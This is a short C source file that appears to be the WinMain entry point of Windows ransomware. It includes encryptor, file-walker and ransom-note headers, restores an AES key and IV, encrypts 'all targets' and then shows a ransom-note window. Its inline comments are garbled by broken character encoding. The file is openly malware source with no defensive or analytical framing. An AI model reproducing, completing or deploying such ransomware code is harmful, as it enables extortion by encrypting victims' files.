#include <windows.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    restore_key(aes_key);                   // Ű ����
    restore_iv(iv);                         // IV ����
    encrypt_all_targets(aes_key, iv);       // ��ü ���� ��ȣȭ
    create_ransom_note();                   // ������Ʈ GUI

    return 0;
}
